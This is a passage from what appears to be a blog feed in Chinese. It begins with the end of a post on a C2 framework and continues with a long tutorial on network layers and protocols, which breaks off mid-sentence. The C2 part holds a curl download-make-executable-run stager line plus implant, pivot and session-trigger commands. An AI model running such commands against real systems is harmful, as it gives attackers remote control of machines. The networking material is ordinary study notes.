curl http://localhost/nothingtoseehere.yml?c=14274 --output nothingtoseehere &amp;&amp; chmod u+x nothingtoseehere &amp;&amp; nohup ./nothingtoseehere

Pivotspivots有两种，一种是TCP，另一种是命名管道，TCP适用所有平台，命名管道只能在windows
首先通过use连接到session，然后执行下面命令创建tcp
pivots tcppivots

然后background
generate --tcp-pivot 127.0.0.1 --os linux

Script可以设置简单的自动脚本，但是无法做复杂逻辑，如果要做复杂逻辑，建议还是自己写一个客户端，比如用Python写，然后通过调用服务端的gRPC接口来实现
reaction set -e &quot;session-connected&quot;[*] Setting reaction to: Session Opened? Enter commands:  [Enter 2 empty lines to finish]pwdenv[*] Set reaction to session-connected (id: 1)

这个设置完后，在有新的session连的时候就会自动触发这个脚本
可以通过reaction --help命令查看都有哪些触发事件
]]></content>
      <tags>
        <tag>C2</tag>
      </tags>
  </entry>
  <entry>
    <title>网络</title>
    <url>/2025/04/16/%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[概述计算机网络是一组通过通信链路互相连接的计算设备，它们之间可以进行数据传输、信息共享与远程控制。现在使用的手机、电脑和服务器之间的所有数据交换，都依赖计算机网络的支持。
网络不只是“上网”，而是一整套庞大而复杂的通信机制。为了规范这套机制，人们制定了大量的“网络协议”，这些协议就像交通规则，定义了数据如何发送、接收、确认、重传等等。
整个网络通信体系可以理解为一个“层级架构”，常见的是“五层网络模型”，它从上到下分为：

应用层：你直接接触的网络服务，比如浏览器、微信、QQ 等。
传输层：保障数据可靠或高效传输的机制，代表协议有 TCP、UDP。
网络层：负责选择数据传输路径，代表协议是 IP。
数据链路层：确保在局域网中一跳一跳地正确传送数据。
物理层：底层的电缆、网卡、电信号等。

有了这种分层结构，网络系统可以更易于开发、维护和理解。
应用层应用层位于网络模型的最顶层，直接面向使用者。无论是浏览网页、登录社交平台、收发电子邮件，底层传输的数据最终都要通过应用层协议来组织和解析。应用层不关心数据如何传输，它只关心数据怎么表达、如何理解。
每种网络应用都有对应的应用层协议，用来规定通信双方“说什么”和“怎么说”。就像人与人之间的交流需要语言规范一样，不同应用之间也需要统一协议来协作。

HTTP 协议的基本结构与特性HTTP 是使用最广泛的应用层协议，主要用于浏览器与服务器之间的数据交互。它的特点是无状态、基于文本、灵活可扩展。
一个标准的 HTTP 请求包含三个部分：

请求行：例如 GET /index.html HTTP/1.1
请求头：包含 Host、User-Agent、Accept、Cookie 等字段
请求体：主要出现在 POST 请求中，用于提交数据

HTTP 协议版本的演进也带来了性能的逐步优化：

HTTP&#x2F;1.1 支持持久连接（Keep-Alive），避免每次请求都重新建立连接
HTTP&#x2F;2 引入多路复用，多个请求可以复用同一个 TCP 连接，避免阻塞
HTTP&#x2F;3 改用基于 UDP 的 QUIC 协议，减少连接建立时间并增强安全性


HTTPS 与加密通信机制HTTPS 本质上是 HTTP 协议在 TLS 加密通道下的运行方式，主要解决通信过程中的信息泄露和篡改问题。
使用 HTTPS 时，客户端和服务器会先进行一次 TLS 握手，主要流程包括：

客户端发起连接，带上支持的加密算法
服务器返回数字证书、公钥等信息
客户端验证证书合法性，生成对称密钥并加密传输
双方使用对称密钥进行后续通信


HTTP 请求复用HTTP 请求复用是指在同一个网络连接中，多个 HTTP 请求和响应可以被顺序发送和接收，而不需要为每个请求建立新的连接。这个机制是为了提高网络传输的效率，减少延迟和提高资源利用率。
HTTP 的请求复用在不同版本的协议中有不同的实现方式，主要体现在 HTTP&#x2F;1.x 和 HTTP&#x2F;2 的实现上。
HTTP&#x2F;1.x 的请求复用（有限）在 HTTP&#x2F;1.0 和 HTTP&#x2F;1.1 中，尽管有一定的复用机制，但也有其局限性：
HTTP&#x2F;1.0（无持久连接）
在 HTTP&#x2F;1.0 中，每一个请求都需要独立建立一个新的 TCP 连接，之后该连接关闭。这意味着如果一个页面需要多个资源（如图片、CSS、JavaScript 文件等），每个资源都需要一个独立的连接，这会导致连接建立和关闭的开销非常大。

HTTP&#x2F;1.1（支持持久连接）
持久连接：HTTP&#x2F;1.1 引入了持久连接（Persistent Connection，Connection: keep-alive），允许多个请求和响应复用同一个 TCP 连接，从而避免了为每个请求建立新连接的开销。
Keep-Alive：通过 Connection: keep-alive 头部，HTTP&#x2F;1.1 允许在一个连接上发送多个请求和接收多个响应，而无需每次都重新建立连接。
但是，HTTP&#x2F;1.1 的复用也有限制。即使同一个连接上可以发送多个请求，它仍然是按顺序处理的，每次请求都必须等待前一个请求的响应完成（队头阻塞问题：指的是由于一个数据包或请求的延迟，导致同一连接中的后续数据包或请求也必须等待这个延迟的数据包或请求完成，从而造成整体的延迟增加）。这意味着多个请求不能并行地发送。



HTTP&#x2F;2 的请求复用（更高效）HTTP&#x2F;2 对请求复用进行了显著的改进，特别是在减少延迟和解决 HTTP&#x2F;1.x 中的“队头阻塞”问题方面。
多路复用（Multiplexing）
多路复用是 HTTP&#x2F;2 的核心特性之一。HTTP&#x2F;2 允许多个请求和响应在同一个连接上 并行 发送，而不会互相阻塞。不同的请求和响应通过 流（stream） 来区分，每个流有一个唯一的标识符。这样，多个请求和响应可以同时在同一个连接上发送和接收，而不必等待前一个请求的完成。
流（Stream）：HTTP&#x2F;2 中的流是一条双向的数据通道，允许请求和响应并行进行。每个流可以独立传输数据，并且流之间是互相独立的，不会因为一个流的延迟而影响其他流的传输。
头部压缩：HTTP&#x2F;2 使用 HPACK 头部压缩机制，减少了重复的头部信息，从而节省带宽和提高传输效率。
优先级和流控制：HTTP&#x2F;2 允许客户端和服务器为不同的请求分配优先级，以便合理利用带宽和资源。



减少延迟
在 HTTP&#x2F;2 中，客户端可以在同一个连接中同时发送多个请求，不需要等待每个请求的响应。这意味着对于加载多个资源（如图片、CSS、JavaScript 文件等）时，所有的请求可以并行地发送，显著减少了加载时间。
请求复用 解决了 HTTP&#x2F;1.x 中的队头阻塞问题，即使是同一个连接上的多个请求，它们也能够并行传输，从而大幅提高了性能。

头部压缩
HTTP&#x2F;2 使用 HPACK 压缩算法来压缩 HTTP 请求和响应的头部信息，减少了传输的数据量，进一步提高了效率。

HTTP&#x2F;3 的请求复用（基于 QUIC）HTTP&#x2F;3 是基于 QUIC 协议的，它进一步改进了请求复用，并解决了网络中断时的恢复问题。
QUIC 和 HTTP&#x2F;3
HTTP&#x2F;3 基于 QUIC（Quick UDP Internet Connections）协议，QUIC 是一个基于 UDP 的协议，旨在降低延迟并提高可靠性。QUIC 本身具有多路复用的能力，允许多个请求和响应并行处理。
由于 QUIC 设计时就考虑到了减少连接建立时间，它比基于 TCP 的 HTTP&#x2F;2 更加高效，尤其是在网络不稳定或需要频繁切换网络的情况下。
QUIC 通过 0-RTT 连接恢复，减少了建立连接的时间，从而进一步降低了延迟。

请求复用
在 HTTP&#x2F;3 中，多个请求和响应仍然能够在一个连接中并行地进行，并且不受 TCP 的限制（如队头阻塞）。QUIC 本身在多个数据流上进行多路复用，支持更高效的并发传输。

总结
HTTP&#x2F;1.1 提供了持久连接的功能，允许在同一个 TCP 连接上复用多个请求，但由于“队头阻塞”问题，它的复用效率有限。
HTTP&#x2F;2 引入了 多路复用，允许多个请求和响应并行地在同一个连接上进行传输，显著提高了效率并减少了延迟。
HTTP&#x2F;3 在 HTTP&#x2F;2 的基础上使用了 QUIC 协议，进一步优化了请求复用，特别是在减少连接建立时间和提高传输效率方面。

因此，HTTP&#x2F;2 和 HTTP&#x2F;3 提供了更加高效的请求复用机制，相比于 HTTP&#x2F;1.x，它们在多个资源并行加载和减少延迟方面表现更优。

DNS 协议与域名解析过程DNS 是将域名解析为 IP 地址的协议，是一切网络访问的起点。比如在浏览器中输入 www.example.com，系统会首先发起一次 DNS 查询。
DNS 查询过程可能包括：

本地 DNS 缓存查找
向本地域名服务器发起递归查询
逐层向根域名服务器、顶级域名服务器、权威服务器发起迭代查询
获取到 IP 地址后，将结果缓存一段时间


WebSocket 实现双向通信WebSocket 是建立在 HTTP 协议之上的全双工通信协议，适用于需要实时推送的应用场景，比如在线聊天、股票行情、游戏等。
WebSocket 在建立连接阶段，会通过 HTTP 协议完成一次握手，之后升级为长连接通道，可以实现客户端与服务端之间的持续通信。
它的优势在于：

减少 HTTP 的频繁握手开销
支持低延迟、持续推送
客户端和服务器都可以主动发送消息

常见问题包括：与轮询、长轮询的区别、心跳机制的实现方式、如何处理断线重连等。
Websocket 轮询、长轮询轮询（Polling）
定义：轮询是一种定时向服务器发送请求，查询数据是否有更新的方式。
工作原理：
客户端定时发送HTTP请求到服务器，询问是否有新的数据或事件。
服务器处理请求并返回结果，客户端再根据返回的数据更新页面。


特点：
每隔一定时间（例如每秒）发送HTTP请求到服务器，即便没有新数据，服务器也会返回一个空的响应。
消耗带宽：即使没有新数据，轮询也会带来不必要的请求和响应负载。
延迟较高：因为请求是定期发起的，所以客户端无法获得即时更新。



长轮询（Long Polling）
定义：长轮询是轮询的改进版，客户端发送请求到服务器，直到服务器有新数据时才响应。
工作原理：
客户端向服务器发送一个HTTP请求，服务器如果有新数据，则立即返回响应；如果没有新数据，服务器会保持连接，直到有数据时再返回响应。
客户端接收到响应后，再次发起新的请求，继续等待服务器的更新。


特点：
更低的带宽消耗：相较于轮询，长轮询只有在有新数据时才返回响应。
相较于传统轮询，长轮询的延迟较低，因为它减少了不必要的请求。
仍然是单向的：尽管是保持连接，客户端和服务器之间的通信仍然是单向的，服务器只能响应客户端的请求。



WebSocket 心跳机制的实现方式心跳机制（Heartbeat）是为了保持 WebSocket 连接的有效性，防止连接因空闲超时被中间设备（如防火墙、代理服务器）关闭。它还可以帮助客户端检测服务器是否正常运行。
实现方式：
客户端发起心跳：
客户端定期向服务器发送简单的 ping 请求，例如每隔一定的时间（如 30 秒或 1 分钟），客户端发送一个空的数据包，服务器收到后返回 pong。
如果客户端在超时之前没有收到响应，说明连接可能已断开，客户端可以尝试重新连接。


服务器发起心跳：
服务器可以定期向客户端发送 ping 请求，客户端收到后返回 pong 响应。
如果客户端在一定时间内没有返回 pong，服务器可以主动关闭连接或重新连接。


使用 WebSocket 扩展：
一些库或框架会实现 WebSocket 扩展，自动进行心跳机制的管理，确保连接的稳定性。


心跳消息格式：
通常心跳消息内容为空，例如：ping 和 pong，这并不涉及任何实际的数据传输，仅仅是连接活跃的信号。



WebSocket 断线重连处理断线重连是保证 WebSocket 连接在网络异常或服务器断开连接的情况下能够自动恢复连接的机制。

客户端检测连接状态：
客户端需要监听 WebSocket 的 onclose 事件，检测到连接断开后，触发重连逻辑。
客户端可以设置一个 重连延迟，逐步延迟重连尝试，避免因过于频繁的重连请求造成额外的负载。


指数退避算法：
使用指数退避算法（Exponential Backoff）来避免频繁重连。每次重连失败后，重连间隔逐步增加，直到达到最大重连次数或时间。


自动重连逻辑：
客户端可以在 WebSocket 断开后设置自动重连。例如，在 onclose 事件中，尝试重新建立连接，直到成功。
有时可以结合心跳机制，定期检查连接的状态，在连接失效时触发重连。


服务器端处理：
服务器端可以设置连接的 超时时间，如果客户端长时间未能响应心跳或者其他操作，服务器会主动关闭连接。
服务器应能在客户端重连时恢复之前的会话状态，避免丢失数据。




常见的其他应用层协议除了 HTTP、HTTPS 和 DNS，还有很多常用协议在实际开发和部署中不可或缺：
FTP（文件传输协议）
基于 TCP
支持用户认证、文件上传下载
有主动模式和被动模式之分，网络环境复杂时需谨慎配置防火墙

SMTP、POP3、IMAP（电子邮件协议）
SMTP 用于发送邮件，POP3 和 IMAP 用于接收邮件
POP3 会将邮件拉取到本地，IMAP 则支持服务器同步
现在常见邮件服务通常使用加密版本，如 SMTPS、IMAPS


DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）工作在应用层。
虽然它的主要作用是为主机自动分配 IP 地址、子网掩码、网关、DNS 等网络参数，这些信息属于网络层的范畴，但协议本身是由应用层定义和执行的。
DHCP 的运作机制简述
DHCP 通常在局域网中使用，典型流程如下：

DHCP Discover：新加入网络的主机会广播发送 DHCP Discover 报文，寻找可用的 DHCP 服务器
DHCP Offer：DHCP 服务器响应并提供一个可用的 IP 地址等配置信息
DHCP Request：主机从接收到的多个 Offer 中选择一个，并发出 Request 报文表示接受
DHCP Acknowledgement：服务器确认并正式分配该地址

这个过程简称为 DORA（Discover, Offer, Request, Acknowledgement） 四步交互。
DHCP 属于应用层的原因

协议的实现是在应用层完成的，使用的是客户端-服务器模型
运行在 UDP 协议之上（即传输层用的是 UDP）
客户端使用端口 68
服务器使用端口 67


报文格式和交互逻辑定义在应用层协议规范中

DHCP 与其他网络层协议的关系
虽然 DHCP 协议属于应用层，但它的作用直接影响网络层的工作：

为网络层配置所需的 IP 地址、子网掩码、默认网关
帮助主机自动获取 DNS 地址，从而支持域名解析（也是应用层功能）

因此可以理解为：DHCP 是一个在应用层工作的协议，用来自动配置网络层参数。

传输层传输层的作用传输层位于应用层之下，主要负责在两个主机之间提供端到端的数据传输服务。相比网络层只关心数据从哪台主机传到哪台主机，传输层更进一步，确保具体的应用程序之间可以可靠或高效地通信。
常见的传输层协议包括 TCP 和 UDP。两者在可靠性、传输速度、连接管理等方面差异明显，适用场景也不同。

TCP 协议的核心特性TCP（Transmission Control Protocol）是面向连接的协议，强调可靠传输，具备完整的错误检测、丢包重传、数据排序与流量控制机制。
面向连接TCP 通信前必须建立连接，这一过程通过“三次握手”完成。连接建立后，双方可以双向稳定通信，通信结束后通过“四次挥手”释放连接资源。
有序传输TCP 使用序列号（Sequence Number）对每一个字节进行编号，接收方按顺序重组数据，确保数据按发送顺序到达。
可靠传输机制TCP 提供多种机制保障传输可靠：

确认应答：接收方每收到数据会发送 ACK 确认包
重传机制：若一定时间内未收到 ACK，发送方会重发数据
超时重传：根据 RTT 动态计算超时时间，避免网络阻塞
拥塞控制与流量控制：根据网络状态和接收能力调整发送速度，防止网络拥塞或接收端被压垮

全双工通信TCP 支持双方同时发送和接收数据，底层通过维护两个单独的数据流来实现。

TCP 三次握手与四次挥手三次握手过程
客户端发送 SYN（同步）包，进入 SYN_SENT 状态
服务器回复 SYN+ACK 包，进入 SYN_RCVD 状态
客户端回复 ACK，双方进入 ESTABLISHED 状态，连接建立完成

这样可以确保双方都具备发送与接收的能力，并同步初始序列号。
四次挥手过程
客户端发送 FIN，表示无数据可发
服务器回复 ACK，进入 CLOSE_WAIT 状态
服务器处理完剩余数据后，发送 FIN
客户端回复 ACK，等待一段时间后关闭连接

这种拆分可以让服务器在释放连接前处理完未发送完的数据。

TCP 的流量控制与拥塞控制流量控制TCP 使用滑动窗口机制进行流量控制，窗口大小由接收方通知发送方，表示“还能接收多少数据”。发送方根据这个值控制发送速率，避免接收方缓存被压满。
拥塞控制TCP 通过以下策略应对网络拥塞：

**慢启动（Slow Start）：**每次翻倍，直到阈值后进入拥塞避免
**拥塞避免（Congestion Avoidance）：**线性增加
**快速重传（Fast Retransmit）：**发送方收到三个连续的对最后包的ACK，说明后续包丢失，触发快速重传
**快速恢复（Fast Recovery）：**触发快速重传后，拥塞窗口（CWND） 会被 减少到慢启动阈值（ssthresh）的一半，并且 ssthresh 被设置为当前 CWND 的一半，然后线性增长，大概是这样，这里具体是啥忘了。。

这些策略通过调整拥塞窗口大小，在检测到丢包时迅速反应，从而动态调节传输速率。

UDP 协议的特点UDP（User Datagram Protocol）是无连接的协议，强调快速、轻量、无需握手。
无连接模型UDP 不建立连接，也不维持连接状态，发送数据不需要对方回应。适用于对时延要求高、偶尔丢包可以接受的场景，如视频通话、语音传输、DNS 请求等。
不保证顺序和可靠性UDP 数据包称为“数据报”，独立发送，不保证顺序，也不重传丢失的包。上层应用如果需要可靠性，需要自己实现逻辑。
高效传输由于没有握手、确认等机制，UDP 的延迟更低，适合实时性强的通信场景。

传输层端口的作用传输层使用端口号来区分主机上的不同进程。每个网络连接都有四元组标识：

源 IP
源端口
目标 IP
目标端口

端口范围为 0-65535，其中 0-1023 为知名端口，常见如：

HTTP：80
HTTPS：443
DNS：53
FTP：21
SSH：22

端口号帮助操作系统将收到的数据准确交付到目标应用程序。

TCP 粘包与拆包问题粘包和拆包 是在 TCP 协议中常见的问题，通常发生在数据发送和接收的过程中。由于 TCP 是面向流的协议（stream-oriented），它并不像 UDP 那样把每个数据包都当作独立的单位进行处理，而是将数据流通过一个持续的连接进行传输。这种特性导致了 粘包 和 拆包 问题的出现。
什么是粘包和拆包
粘包（Packet Concatenation）：在发送多个数据包时，由于 TCP 协议是一个 面向流的协议，多个数据包可能被合并成一个大的数据块发送，接收方接收到的数据就可能包含了多个发送的数据包。这种现象叫做“粘包”。也就是说，接收方读取的一个数据包可能包含了多个逻辑数据包，接收方需要能够正确区分这些数据包。
拆包（Packet Fragmentation）：拆包与粘包相反，发生在发送的数据包被拆分成多个部分。由于网络传输的最大传输单元（MTU）限制，数据包可能会被分割为多个部分进行发送，接收方需要正确地将这些部分重新组合成一个完整的消息。也就是说，发送方发送的数据包可能会被拆成多个小块，接收方需要知道如何将这些碎片拼接回原始数据包。

为什么会发生粘包和拆包问题TCP 是一个 面向字节流 的协议，它不会保留消息边界的概念。这意味着：

在传输过程中，发送方并不会告诉接收方每次发送的数据包的边界（即数据包的开始和结束）。
接收方收到的 TCP 数据流可能是由多个包拼接成的一个大数据块，或者一个大包被拆分成多个小数据块。

这些特点导致了 粘包 和 拆包 问题的出现。
粘包的原因：
发送方连续快速发送数据：发送方将多个数据包快速发送，接收方无法分辨各个数据包的边界。
TCP的流式传输：TCP 将数据作为字节流发送，没有对消息边界的明确区分，接收方必须根据协议自行处理数据的划分。

拆包的原因：
数据包大小超出网络的最大传输单元（MTU）：TCP 会根据网络的最大传输单元来分割数据，如果发送的数据包大小超过了 MTU，数据会被拆分成多个部分发送。
数据过大或系统缓冲区限制：系统在传输过程中可能会因为缓冲区大小的限制将数据拆分为多个部分。

TCP 如何处理粘包和拆包问题TCP 协议本身并不提供 消息边界 的机制，因此开发者需要在 应用层 处理粘包和拆包问题。常见的解决方法包括：
固定长度的数据包
概念：如果每个发送的数据包的大小是固定的，接收方就可以通过固定长度来划分数据流。例如，每次发送的数据包都是 1024 字节，那么接收方每次就可以按照 1024 字节来读取数据。
优点：简单且容易实现，接收方只需每次读取固定长度的数据即可。
缺点：如果数据包大小不固定，或者数据变化较大，这种方式就不能很好地处理。

分隔符（协议中的特殊标识符）
概念：通过在每个数据包的末尾加上一个特殊的分隔符（例如换行符 \n 或自定义的结束标志），接收方通过检测这些分隔符来判断数据包的边界。
优点：简单易用，适用于小数据量的传输。
缺点：如果数据内容本身可能包含这些分隔符，必须保证发送的数据内容不干扰分隔符的作用，或者使用更复杂的编码方式来保证分隔符的唯一性。

长度字段（长度前缀）
概念：每个数据包的开头附加一个固定长度的字段，表示该数据包的长度。接收方首先读取长度字段，然后根据长度字段来读取实际的数据内容。
工作流程：
发送方在每个数据包的头部加上一个 长度字段（例如 4 字节，用来表示数据包的大小）。
接收方首先读取这个长度字段，然后根据长度字段读取相应数量的字节。


优点：这种方式能够很好地处理变长的数据包，适用于各种情况。
缺点：每个数据包需要额外的存储空间来保存长度字段，这增加了额外的开销。

基于时间的读取
概念：接收方根据一个固定的超时时间来确定数据包的边界。它不断地从 TCP 流中读取数据，当读取到一定数量的数据后，或者等待超时后，就将这些数据作为一个完整的消息处理。
优点：简单且适用于数据传输速度较慢或传输间隔较长的场景。
缺点：依赖于延时和时间的控制，可能不适用于高性能要求的场景。

实际应用中的常见方法
HTTP 协议：HTTP 使用 请求头 中的 Content-Length 或 Transfer-Encoding（如分块传输编码）来标识每个数据包的大小，从而避免了粘包和拆包问题。
WebSocket：WebSocket 协议提供了基于消息的传输，可以避免粘包和拆包问题，因为它保证每个消息都是独立的，不会混合或拆分。
自定义协议：在很多应用中，开发者会使用 长度字段 或 分隔符 来设计自定义协议，以解决粘包和拆包问题。例如，使用 \n 来分隔每一行数据，或者在每个数据包前加上长度字段，告诉接收方数据的大小。


网络层网络层的作用网络层位于传输层之下，主要负责将数据从一台主机跨越多个网络传输到另一台主机。其核心任务包括：

寻址：为每台主机分配唯一的地址（IP 地址）
路由：选择一条合适的路径将数据包从源头传到目的地
分片与重组：在链路层无法承载大数据包时进行分段传输

可以将网络层类比为快递公司的“全国调度系统”，负责确定哪条路线可以最快、最稳地将快递送到目的地城市。

IP 协议与地址结构IP 协议（Internet Protocol）是网络层的核心协议。每台连接到网络的设备都需要一个唯一的 IP 地址，用来标识其网络位置。
IPv4 地址结构IPv4 使用 32 位地址，通常以点分十进制表示，例如：192.168.1.1
IP 地址由两部分组成：

网络号：标识所属的网络
主机号：标识该网络中的主机

为了支持更多网络，IP 地址又与“子网掩码”配合使用，进行网络划分。
例如：IP 地址：192.168.1.10子网掩码：255.255.255.0则网络号为 192.168.1.0，主机号为 10

子网划分与 CIDR 表示法为了更灵活地管理 IP 资源，引入了无类别域间路由（CIDR）表示法。例如：
192.168.1.0/24

其中 /24 表示前 24 位是网络号，后 8 位用于主机编号。可以容纳的主机数为：
2^(32 - 子网掩码长度) - 2

常见的子网划分技巧包括：

减少广播范围，提升局域网效率
合理分配地址空间，减少浪费
提供更好的网络隔离和安全性


IP 数据报结构与分片机制IP 协议是无连接、不可靠的，主要负责将数据打包为 IP 数据报并发送。
数据报结构包括：

首部：版本号、源 IP、目标 IP、TTL、协议类型等
数据部分：封装的传输层数据（如 TCP 报文）

当数据报超过底层链路的最大传输单元（MTU）时，需要进行分片：

每片包含 IP 首部 + 数据片段
设置分片偏移标志，指明每片在原始数据中的位置
目标主机在收到所有片段后再重新组装

注意：IP 分片通常由发送端或路由器完成，但过度分片可能影响性能，很多现代协议（如 TCP）会避免发送超出 MTU 的数据包。

ICMP 协议与网络诊断ICMP（Internet Control Message Protocol）是网络层的重要辅助协议，主要用于网络诊断和错误反馈。
常见用途：

ping 命令：通过发送 ICMP Echo 请求检测目标主机是否可达
traceroute 工具：用于查看数据经过的所有路由节点，通过控制 TTL 值和接收 ICMP 超时报文实现

ICMP 类型众多，例如：

类型 0：Echo Reply
类型 3：目标不可达
类型 11：TTL 超时

虽然 ICMP 不用于传输实际业务数据，但在排查网络故障、判断网络连通性时极为重要。

路由选择与路由协议网络层需要选择一条合适的路径将数据包从源头传送到目标地址，这就依赖于路由表和路由协议。
静态路由与动态路由
静态路由：由管理员手动配置，适用于结构简单、变化少的网络
动态路由：由路由协议自动计算和维护，适用于大型复杂网络

常见的路由协议
RIP（Routing Information Protocol）：基于跳数，收敛慢，适合小网络，属于网关协议 (IGP - Interior Gateway Protocol)
OSPF（Open Shortest Path First）：基于链路状态，收敛快、可扩展性强，属于内部网关协议
BGP（Border Gateway Protocol）：用于自治系统间的路由，是互联网骨干的重要协议，属于外部网关协议 (EGP - Exterior Gateway Protocol)

每种协议都有自己的适用范围和策略权重，实际使用时通常会根据网络规模和稳定性要求综合选择。

网络地址转换（NAT）由于 IPv4 地址资源有限，大多数家庭或公司网络使用 NAT 技术让多个内网设备共享一个公网 IP。
常见的 NAT 类型：

静态 NAT：一对一映射，适合需要被外网访问的服务
动态 NAT：从公网 IP 池中动态分配
PAT（端口地址转换）：最常见形式，也称为 NAPT，让多个内网设备共用同一个公网 IP，通过端口区分不同连接

NAT 极大地缓解了地址资源紧张问题，但也带来了一些限制，例如 P2P 通信受阻、端到端加密挑战等。

数据链路层数据链路层的作用数据链路层位于网络层之下，主要职责是在同一链路内的两个节点之间可靠地传输数据帧。它不关心数据从哪台主机来，也不关心去往哪里，它只处理“从这一跳送到下一跳”。
网络通信过程中，每经过一个路由器，数据链路层的链路就会断开并重新建立。因此，数据链路层的通信是逐段进行的，而非端到端。

MAC 地址与链路标识数据链路层使用 MAC 地址（Media Access Control Address）作为主机的唯一标识。每个网卡在出厂时都会被烧录一个唯一的 48 位地址，一般用十六进制表示，例如：
00:1A:2B:3C:4D:5E

MAC 地址工作在局域网范围，不能跨越路由器。而 IP 地址是逻辑地址，可以通过网络层路由转发。
MAC 地址在以太网通信中扮演“收件人”和“寄件人”的角色。网络设备通过 MAC 地址找到数据帧的目标主机。

以太网帧的结构以太网是最常见的链路层协议，它定义了数据帧的格式和传输方式。标准以太网帧结构如下：
+----------------+----------------+-------------+---------------+-------------+|  目的 MAC 地址  |  源 MAC 地址   |  类型字段    |  数据（Payload） |  CRC 校验值   |+----------------+----------------+-------------+---------------+-------------+


目的 MAC 地址：目标设备的地址
源 MAC 地址：发送设备的地址
类型字段：指出上层协议（如 0x0800 表示 IP 协议）
数据部分：封装上层传输层或网络层的数据
CRC 校验：用于检测数据在传输中是否被篡改

每个数据帧最大传输单元（MTU）通常为 1500 字节，超出部分需要网络层进行分片。

ARP 协议实现地址解析ARP（Address Resolution Protocol）是数据链路层与网络层之间的桥梁，用于将 IP 地址解析为 MAC 地址。
典型的 ARP 流程
主机 A 想发送数据给主机 B，只知道 B 的 IP 地址
A 在局域网广播 ARP 请求，询问“谁是这个 IP？”
B 收到后，发送 ARP 回复，告知自己的 MAC 地址
A 将 B 的 MAC 地址缓存在 ARP 表中，用于后续通信

这种机制是动态的，ARP 缓存会在一段时间后过期并重新解析。

广播、单播与多播的区别链路层通信模式有三种：

单播（Unicast）：点对点通信，只发给目标 MAC 地址
广播（Broadcast）：发给局域网内所有设备，MAC 地址为 FF:FF:FF:FF:FF:FF
多播（Multicast）：发给特定一组设备，MAC 地址以 01:00:5E 开头

ARP 请求就是典型的广播形式，DHCP 请求、网络发现等服务也常用广播或多播机制。

交换机的基本工作原理交换机是工作在数据链路层的核心设备。它通过维护一个MAC 地址表，实现高效的帧转发。
工作流程如下：

交换机收到一个数据帧，记录其源 MAC 与入口端口
查找目的 MAC 是否已在表中
有：直接将数据帧发到对应端口
没有：广播给所有端口（除接收端），等待目的主机响应



交换机比集线器更智能，能够避免不必要的广播，提高网络性能。

集线器的基本工作原理集线器的工作原理可以理解为一个非常简单的“广播”设备。当一个设备发送数据到集线器时，集线器会将数据传递给所有其他连接到它的设备，而不是根据目标地址将数据发送给特定的设备。这意味着集线器没有智能化地判断哪些设备应该接收数据，它只是将接收到的数据广播到所有端口。

VLAN 与链路层隔离机制VLAN（Virtual LAN）是一种逻辑上的网络隔离方式，可以将不同物理位置的主机划分到同一个逻辑广播域中。
通过给以太网帧增加 VLAN Tag，可以将网络划分为多个逻辑子网，达到以下目的：

控制广播范围
提升网络安全
简化网络管理

VLAN 是一种链路层技术，但其配置依赖交换机对 802.1Q 协议的支持。

数据链路层中的错误检测数据链路层不保证数据可靠，但会尽力发现错误并丢弃异常帧。其中最常见的机制是：

CRC 校验：帧末尾附加校验值，用于检测传输过程中的比特错误
帧长检查：非法帧长通常直接丢弃
MAC 地址过滤：不符合地址匹配的帧会被忽略

但需要注意的是，链路层不会自动重传数据，重传逻辑通常由传输层（如 TCP）来完成。

广播风暴一些协议或服务（例如 ARP 请求、DHCP 发现请求）会产生广播数据包。如果网络中没有有效的流量控制或广播限制，可能导致广播包递归传播，形成广播风暴。
生成树协议（STP） 是一种网络协议，用于防止交换机网络中的环路。STP 通过关闭某些冗余路径，确保在网络中没有环路，从而避免广播风暴的发生。

物理层物理层的作用物理层处于网络模型的最底层，负责将比特流（0 和 1）通过各种物理媒介在设备之间传输。它不关心数据的格式、结构和含义，只关注如何把 0 和 1 表示成物理信号，并尽可能地准确传送到接收端。
简单来说，物理层就是在解决“如何把数据发出去”，包括电缆、网卡、光纤、无线信号等。

比特传输与编码方式数据在物理层以比特（bit）为单位传输。传输方式有很多种，不同场景使用的编码方式可能不同：

非归零编码（NRZ）：高电平表示 1，低电平表示 0
曼彻斯特编码：用电平跳变表示比特，抗干扰能力更强
基带传输与宽带传输：直接调制与间接调制的区别

传输的信号可以是：

电信号（双绞线、同轴电缆）
光信号（光纤）
无线电波（Wi-Fi、蓝牙）

这些信号的生成、放大、转换与传输都归属物理层。

传输介质的类型物理层涉及的传输介质通常有以下几种：
双绞线（Twisted Pair）最常用的网线类型，如 CAT5e、CAT6。其内部由成对缠绕的铜线构成，用于抵消电磁干扰。支持百兆、千兆、万兆等传输速率。
光纤（Fiber Optic）以光信号方式传输数据，传输速率极高、距离远、抗干扰能力强。分为单模光纤和多模光纤，广泛用于数据中心与骨干网。
同轴电缆（Coaxial Cable）早期局域网中常用的介质，现在主要用于有线电视网络。结构上有良好的屏蔽层，但已不常用于现代以太网。
无线传输包括 Wi-Fi、蓝牙、蜂窝通信等，使用射频方式进行比特传输。属于物理层的无线信号载波，与链路层的无线协议配合使用。

常见接口标准物理层的另一个重要部分是定义硬件接口标准，这些标准规定了：

电压水平
接口形状
速率规范
引脚定义

常见接口包括：

RJ45：以太网常用接口
光纤接头（如 SC、LC）：用于光纤通信
USB、HDMI、Serial Port：部分接口标准也涵盖物理层定义
802.11 系列标准：Wi-Fi 的物理层和链路层协议合集


信号传输中的干扰与失真物理层传输的信号可能受到多种干扰：

串扰：相邻线路之间的电磁干扰
噪声：来自电源、无线电、机械等外部环境的干扰
衰减：信号随着距离的增加而变弱
反射与回波：不良接头或阻抗不匹配导致信号反弹

为了减少这些问题，通常需要配合屏蔽电缆、信号放大器、调制器等硬件设施。

传输速率与带宽概念物理层中常涉及两个容易混淆的术语：

带宽（Bandwidth）：表示信道理论上能承载的频率范围，单位为 Hz
速率（Data Rate）：表示单位时间传输的比特数量，单位为 bps（bit per second）

带宽越高，理论上的数据传输能力越强。但最终的传输速率还受到调制方式、信噪比、协议效率等多种因素影响。
例如：

100BASE-T：百兆以太网，最大 100 Mbps
1000BASE-T：千兆以太网，最大 1000 Mbps
10GBASE-SR：万兆光纤网络


调制解调的基本概念在一些物理层实现中（尤其是模拟线路），比特信号不能直接传输，需要通过调制技术将数字信号转换为模拟信号，接收端再进行解调。
典型例子是电话线使用的 ADSL、早期拨号上网使用的调制解调器（Modem）：

调制（Modulation）：将数字信号嵌入到载波中传输
